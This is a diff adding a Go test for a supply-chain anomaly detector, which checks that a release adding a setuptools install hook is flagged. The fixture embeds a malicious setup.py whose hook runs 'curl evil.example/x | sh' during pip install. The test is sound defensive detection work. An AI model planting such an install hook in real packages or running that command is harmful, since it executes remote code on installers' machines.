@@ -661,6 +661,58 @@ func TestCollector_PyPICredentialStealerProgression_FiresAnomaly(t *testing.T) {
 		"the credential-read capability gain must be named for the analyst")
 }
 
+// TestCollector_PyPISetupHookProgression_FiresAnomaly covers the
+// iconic install-time vector: a clean declarative setup.py, then a
+// release that adds a setuptools install-command subclass running a
+// shell payload at `pip install`. install_hook_overrides must be
+// among the named spiked features.
+func TestCollector_PyPISetupHookProgression_FiresAnomaly(t *testing.T) {
+	t.Parallel()
+
+	const cleanSetup = "from setuptools import setup, find_packages\n" +
+		"setup(name='demo', packages=find_packages())\n"
+	const core = "def go():\n    return 1\n"
+
+	const weaponizedSetup = "" +
+		"from setuptools import setup\n" +
+		"from setuptools.command.install import install\n" +
+		"import os\n" +
+		"class _Hook(install):\n" +
+		"    def run(self):\n" +
+		"        os.system('curl evil.example/x | sh')\n" +
+		"        install.run(self)\n" +
+		"setup(name='demo', cmdclass={'install': _Hook})\n"
+
+	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
+		{Tag: "3.0.0", Files: map[string]string{"setup.py": cleanSetup, "demo/__init__.py": core}},
+		{Tag: "3.1.0", Files: map[string]string{"setup.py": weaponizedSetup, "demo/__init__.py": core}},
+	})
+
+	pinSource := &fakePinSource{
+		table: PinTable{
+			ModulePath: "demo",
+			Pins: []VersionPin{
+				{Version: "3.0.0", SHA: shaByTag["3.0.0"], Source: "pypi-attestation",
+					PublishedAt: time.Date(2026, 1, 10, 0, 0, 0, 0, time.UTC)},
+				{Version: "3.1.0", SHA: shaByTag["3.1.0"], Source: "pypi-attestation",
+					PublishedAt: time.Date(2026, 3, 10, 0, 0, 0, 0, time.UTC)},
+			},
+		},
+	}
+
+	c := NewCollector(clonePath, pinSource, false)
+	result, err := c.Collect(t.Context(), pypiEntity("demo"))
+	require.NoError(t, err)
+
+	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
+	var anomaly AnomalyValue
+	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
+	assert.True(t, anomaly.AnomalyPresent, "a setup.py install-hook gain must trip the anomaly")
+	assert.Equal(t, "3.1.0", anomaly.FirstAnomalousVersion)
+	assert.Contains(t, anomaly.SpikedFeatures, "install_hook_overrides",
+		"the install-hook capability gain must be named for the analyst")
+}
+
 // TestCollector_Name_IsSourceEvolution pins the source-tracking
 // string. Any rename here cascades into stored signal rows and
 // dogfood-metrics aggregations.
